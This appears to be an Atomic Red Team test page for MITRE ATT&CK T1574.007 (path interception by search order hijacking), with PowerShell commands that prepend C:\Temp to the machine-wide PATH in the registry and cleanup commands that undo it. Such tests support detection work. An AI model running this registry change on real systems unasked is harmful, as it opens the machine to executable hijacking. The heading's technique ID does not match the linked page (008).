# T1574.007 - Hijack Execution Flow: Path Interception by Search Order Hijacking
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1574/008)
<blockquote>Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program. [1] [2] [3] However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.</blockquote>

## Atomic Test #1 - Path Interception by Search Order Hijacking
Add PATH Environment Variable

**Supported Platforms:** Windows


**auto_generated_guid:** 1561de08-0b4b-498e-8261-e922f3494aa1






#### Attack Commands: Run with `powershell`! 


```powershell
        $oldPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).Path
        $newPath = 'C:\Temp;' + $oldPath
        Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Value $newPath
```

#### Cleanup Commands:
```powershell
        $Environment = [System.Environment]::GetEnvironmentVariable("Path", "Machine")
        foreach ($path in ($Environment).Split(";"))
            {
            if ($path -like "*C:\Temp*")
                {
                $Environment = $Environment.Replace($Path ,"")
                }
            if ($path -like "*c:\temp*")
                {
                $Environment = $Environment.Replace($Path ,"")
                }
            }
        [System.Environment]::SetEnvironmentVariable("Path", $Environment, "Machine")
```
